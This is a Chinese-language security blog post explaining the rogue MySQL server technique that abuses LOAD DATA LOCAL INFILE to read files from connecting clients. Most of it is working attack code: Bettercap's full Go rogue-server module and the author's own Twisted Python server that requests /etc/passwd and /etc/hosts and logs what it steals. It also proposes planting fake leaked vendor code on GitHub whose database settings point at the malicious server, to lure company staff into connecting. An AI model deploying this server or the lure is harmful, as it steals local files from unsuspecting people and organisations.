***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **某天看到 lightless 师傅的文章[Read MySQL Client's
File](https://lightless.me/archives/read-mysql-client-file.html)，觉得这个「漏洞」真的非常神奇，小小研究了一下具体的利用。 **  

## 0x00 漏洞原理

几篇参考文章已经将原理说的比较清楚了，问题出在 `LOAD DATA INFILE` 的地方，该功能是用于读取客户端上的一个文件，并将其内容导入到一张表中。

在 MySQL 连接建立的阶段会有一个必要的步骤，即

> 客户端和服务端交换各自功能
>
> 如果需要则创建SSL通信通道
>
> 服务端认证客户端身份

还有一个必要的条件就是 MySQL 协议中，客户端是不会存储自身请求的，而是通过服务端的响应来执行操作。

配合这两点就可以发现，我们可以恶意模拟 MySQL 服务端的身份认证过程，等待客户端的 SQL 查询，然后响应时返回一个 `LOAD DATA`
请求，客户端即根据响应内容上传了本机的文件。

借用 lightless 师傅的描述，正常的请求流程为

> 客户端：hi~ 我将把我的 `data.csv` 文件给你插入到 `test` 表中！
>
> 服务端：OK，读取你本地 `data.csv` 文件并发给我！
>
> 客户端：这是文件内容：`balabal`！

而恶意的流程为

> 客户端：hi~ 我将把我的 `data.csv` 文件给你插入到 `test` 表中！
>
> 服务端：OK，读取你本地的 `/etc/passwd` 文件并发给我！
>
> 客户端：这是文件内容：`balabal`（`/etc/passwd` 文件的内容）！

所以，只需要客户端在连接服务端后发送一个查询请求，即可读取到客户端的本地文件，而常见的 MySQL
客户端都会在建立连接后发送一个请求用来判断服务端的版本或其他信息，这就使得这一「漏洞」几乎可以影响所有的 MySQL 客户端。

> 客户端：hi~ 告诉我你的版本！
>
> 服务端：OK，读取你本地的 `/etc/passwd` 文件并发给我！
>
> 客户端：这是文件内容：`balabal`（`/etc/passwd` 文件的内容）！

## 0x01 已有的利用

[Bettercap](https://github.com/bettercap/bettercap) 已经集成好了一个恶意的 MySQL 服务器，可以在
[项目 Wiki](https://github.com/bettercap/bettercap/wiki/mysql.server)
中找到详细的说明，使用也非常简单。

    
    
    $ sudo bettercap -eval "set mysql.server.infile /etc/hosts; mysql.server on"
    

相关代码在
[mysql_server.go](https://github.com/bettercap/bettercap/blob/master/modules/mysql_server.go)。

    
    
    package modules
    
    import (
        "bufio"
        "bytes"
        "fmt"
        "io/ioutil"
        "net"
        "strings"
    
        "github.com/bettercap/bettercap/log"
        "github.com/bettercap/bettercap/packets"
        "github.com/bettercap/bettercap/session"
    
        "github.com/evilsocket/islazy/tui"
    )
    
    type MySQLServer struct {
        session.SessionModule
        address  *net.TCPAddr
        listener *net.TCPListener
        infile   string
        outfile  string
    }
    
    func NewMySQLServer(s *session.Session) *MySQLServer {
    
        mysql := &MySQLServer{
            SessionModule: session.NewSessionModule("mysql.server", s),
        }
    
        mysql.AddParam(session.NewStringParameter("mysql.server.infile",
            "/etc/passwd",
            "",
            "File you want to read. UNC paths are also supported."))
    
        mysql.AddParam(session.NewStringParameter("mysql.server.outfile",
            "",
            "",
            "If filled, the INFILE buffer will be saved to this path instead of being logged."))
    
        mysql.AddParam(session.NewStringParameter("mysql.server.address",
            session.ParamIfaceAddress,
            session.IPv4Validator,
            "Address to bind the mysql server to."))
    
        mysql.AddParam(session.NewIntParameter("mysql.server.port",
            "3306",
            "Port to bind the mysql server to."))
    
        mysql.AddHandler(session.NewModuleHandler("mysql.server on", "",
            "Start mysql server.",
            func(args []string) error {
                return mysql.Start()
            }))
    
        mysql.AddHandler(session.NewModuleHandler("mysql.server off", "",
            "Stop mysql server.",
            func(args []string) error {
                return mysql.Stop()
            }))
    
        return mysql
    }
    
    func (mysql *MySQLServer) Name() string {
        return "mysql.server"
    }
    
    func (mysql *MySQLServer) Description() string {
        return "A simple Rogue MySQL server, to be used to exploit LOCAL INFILE and read arbitrary files from the client."
    }
    
    func (mysql *MySQLServer) Author() string {
        return "Bernardo Rodrigues (https://twitter.com/bernardomr)"
    }
    
    func (mysql *MySQLServer) Configure() error {
        var err error
        var address string
        var port int
    
        if mysql.Running() {
            return session.ErrAlreadyStarted
        } else if err, mysql.infile = mysql.StringParam("mysql.server.infile"); err != nil {
            return err
        } else if err, mysql.outfile = mysql.StringParam("mysql.server.outfile"); err != nil {
            return err
        } else if err, address = mysql.StringParam("mysql.server.address"); err != nil {
            return err
        } else if err, port = mysql.IntParam("mysql.server.port"); err != nil {
            return err
        } else if mysql.address, err = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", address, port)); err != nil {
            return err
        } else if mysql.listener, err = net.ListenTCP("tcp", mysql.address); err != nil {
            return err
        }
        return nil
    }
    
    func (mysql *MySQLServer) Start() error {
        if err := mysql.Configure(); err != nil {
            return err
        }
    
        return mysql.SetRunning(true, func() {
            log.Info("[%s] server starting on address %s", tui.Green("mysql.server"), mysql.address)
            for mysql.Running() {
                if conn, err := mysql.listener.AcceptTCP(); err != nil {
                    log.Warning("[%s] error while accepting tcp connection: %s", tui.Green("mysql.server"), err)
                    continue
                } else {
                    defer conn.Close()
    
                    // TODO: include binary support and files > 16kb
                    clientAddress := strings.Split(conn.RemoteAddr().String(), ":")[0]
                    readBuffer := make([]byte, 16384)
                    reader := bufio.NewReader(conn)
                    read := 0
    
                    log.Info("[%s] connection from %s", tui.Green("mysql.server"), clientAddress)
    
                    if _, err := conn.Write(packets.MySQLGreeting); err != nil {
                        log.Warning("[%s] error while writing server greeting: %s", tui.Green("mysql.server"), err)
                        continue
                    } else if read, err = reader.Read(readBuffer); err != nil {
                        log.Warning("[%s] error while reading client message: %s", tui.Green("mysql.server"), err)
                        continue
                    }
    
                    // parse client capabilities and validate connection
                    // TODO: parse mysql connections properly and
                    //       display additional connection attributes
                    capabilities := fmt.Sprintf("%08b", (int(uint32(readBuffer[4]) | uint32(readBuffer[5])<<8)))
                    loadData := string(capabilities[8])
                    username := string(bytes.Split(readBuffer[36:], []byte{0})[0])
    
                    log.Info("[%s] can use LOAD DATA LOCAL: %s", tui.Green("mysql.server"), loadData)
                    log.Info("[%s] login request username: %s", tui.Green("mysql.server"), tui.Bold(username))
    
                    if _, err := conn.Write(packets.MySQLFirstResponseOK); err != nil {
                        log.Warning("[%s] error while writing server first response ok: %s", tui.Green("mysql.server"), err)
                        continue
                    } else if _, err := reader.Read(readBuffer); err != nil {
                        log.Warning("[%s] error while reading client message: %s", tui.Green("mysql.server"), err)
                        continue
                    } else if _, err := conn.Write(packets.MySQLGetFile(mysql.infile)); err != nil {
                        log.Warning("[%s] error while writing server get file request: %s", tui.Green("mysql.server"), err)
                        continue
                    } else if read, err = reader.Read(readBuffer); err != nil {
                        log.Warning("[%s] error while readind buffer: %s", tui.Green("mysql.server"), err)
                        continue
                    }
    
                    if strings.HasPrefix(mysql.infile, "\\") {
                        log.Info("[%s] NTLM from '%s' relayed to %s", tui.Green("mysql.server"), clientAddress, mysql.infile)
                    } else if fileSize := read - 9; fileSize < 4 {
                        log.Warning("[%s] unpexpected buffer size %d", tui.Green("mysql.server"), read)
                    } else {
                        log.Info("[%s] read file ( %s ) is %d bytes", tui.Green("mysql.server"), mysql.infile, fileSize)
    
                        fileData := readBuffer[4 : read-4]
    
                        if mysql.outfile == "" {
                            log.Info("\n%s", string(fileData))
                        } else {
                            log.Info("[%s] saving to %s ...", tui.Green("mysql.server"), mysql.outfile)
                            if err := ioutil.WriteFile(mysql.outfile, fileData, 0755); err != nil {
                                log.Warning("[%s] error while saving the file: %s", tui.Green("mysql.server"), err)
                            }
                        }
                    }
    
                    conn.Write(packets.MySQLSecondResponseOK)
                }
            }
        })
    }
    
    func (mysql *MySQLServer) Stop() error {
        return mysql.SetRunning(false, func() {
            defer mysql.listener.Close()
        })
    }
    

不过这个 server 实现的较为简单，只能用来临时用一下。

另外又找到一个比较古老的 Python 实现，相关代码在
[rogue_mysql_server.py](https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py)，测试了下也存在和 Bettercap
类似的问题，反正一共也就那么几个请求，完全可以自己来写，这样自由度更高一点。

## 0x02 自行实现

Python 来做 TCP 通信，最常用的就是 Twisted 了，这是一个功能非常完全的异步 TCP 框架，著名的 Scrapy 爬虫框架就是基于
Twisted 的。

仔细看了下 Bettercap 模块的代码和 MySQL 文档，发现其实只需要四个响应，分别是首次连接的 Greeting，第一次请求的
FirstResponseOK，读取文件的 ReadFile 和第二次请求的 SecondResponseOK，只要知道了响应，写 Twisted
的协议就非常简单了。

    
    
    class MySQLProtocol(Protocol):
        """
        MySQL协议
        """
        GREETING, FIRST_RESP, SECOND_RESP, FILE_READ = range(4)
        STATE = {
            GREETING: 'GREETING',
            FIRST_RESP: 'FIRST_RESP',
            SECOND_RESP: 'SECOND_RESP',
            FILE_READ: 'FILE_READ',
        }
    
        def __init__(self):
            super(MySQLProtocol, self).__init__()
            self.state = self.GREETING
            self.logger = Logger(__name__).get_logger()
    
        def connectionMade(self):
            msg = f'Got a new connection from {self.transport.hostname}'
            self.logger.info(msg)
    
            # Greeting
            mysql_greeting = bytes.fromhex(
                '5b0000000a352e362e32382d307562756e7475302e31342e30342e31002d000000403f59264b2b346000fff70802007f8015000000000000000000006869595f525f635560645352006d7973716c5f6e61746976655f70617373776f726400'
            )
            if self.state == self.GREETING:
                # 发送 GREETING 包
                self.transport.write(mysql_greeting)
                self.state = self.FIRST_RESP
    
        def connectionLost(self, reason=connectionDone):
            msg = f'{self.transport.hostname} disconnected'
            self.logger.info(msg)
    
        def dataReceived(self, data):
            filenames = (
                '/etc/passwd',
                '/etc/hosts'
            )
    
            # First response ok
            first_response_ok = bytes.fromhex('0700000200000002000000')
            second_response_ok = bytes.fromhex('0700000400000002000000')
            # Server response with evil
            filename = random.choice(filenames)
            dump_file = chr(len(filename) + 1).encode() + bytes.fromhex('000001fb') + filename.encode()
    
            self.logger.debug(f'Client state: {self.STATE[self.state]}, data received: {data}')
    
            if self.state == self.FIRST_RESP:
                # 发送第一个响应包
                self.transport.write(first_response_ok)
                self.state = self.FILE_READ
                return
    
            elif self.state == self.FILE_READ:
                # 发送读文件包
                self.logger.debug(f'Trying to read {filename}, sending data: {dump_file}')
                self.transport.write(dump_file)
                self.state = self.SECOND_RESP
                return
    
            elif self.state == self.SECOND_RESP:
                # 解析读文件响应 发送第二个响应包
                file_length = len(data)
                try:
                    file_content = data[4: file_length - 4].decode()
                except UnicodeDecodeError:
                    file_content = data[4: file_length - 4]
    
                self.logger.info(f'File received: \n{file_content}')
    
                if len(file_content) > 5:
                    with open(os.path.join(os.path.dirname(__file__), '../logs/mysql_file.log'), 'a+', encoding='utf-8') as f:
                        f.write(f'{self.transport.hostname}\n')
                        f.write(f'{file_content}\n\n\n')
                self.transport.write(second_response_ok)
                self.transport.loseConnection()
                return
    
            else:
                self.logger.warning(f'Unknown client state: {self.state}')
                self.transport.loseConnection()
                return
    

注意：Twisted 的写法是当前连接的变量存在 protocol 中，而整个服务的变量存在 factory 中。

## 0x03 It's a trap!

只要我们把这个恶意的服务开在 3306 端口上，自然会有全球各地的扫描器来光顾，不光能读到一些客户端文件，还能接收到很多各类后门挖矿
payload，不过这只是常规操作。

近两年来，各大厂商都开始做自己的 GitHub 代码监控，防止内部代码泄露，借着这一点，更猥琐的思路是在 GitHub 上传包含各大厂商特征的假代码，在其
MySQL 配置中加上我们恶意服务的地址和端口，这样当厂商监控到 GitHub
的代码，大概翻一下就可以发现配置文件中的数据库密码，一般人都会去连接一下，此时……

不过 Mac 安装的 MySQL 版本默认没有开本地文件上传的功能，触发漏洞需要手动指定 `--enable-local-infile`
参数，只能说一声可惜了。

![1541517968915.png](https://i.loli.net/2018/11/06/5be1b322552c6.png)

疑似某广东公司的请求，可惜没读到文件。

![TIM截图20181106233252.png](https://i.loli.net/2018/11/06/5be1b43eca9f8.png)

抓到的谷歌云扫描器。

![TIM截图20181106233523.png](https://i.loli.net/2018/11/06/5be1b4c838d2a.png)

某俄罗斯扫描器。

## 0x04 展望

一个只能读特定文件的洞说起来还是用处小了一点，之后计划再集成一下之前 AWVS 8 和 10 的命令执行，做成一个更有威力的反击工具。

## 0xFF 参考文章

> <https://www.anquanke.com/post/id/106488>
>
> <https://lightless.me/archives/read-mysql-client-file.html>
>
> <https://github.com/bettercap/bettercap>
>
> <http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/>

 ***本文作者：美丽联合安全MLSRC，转载请注明来自FreeBuf.COM**

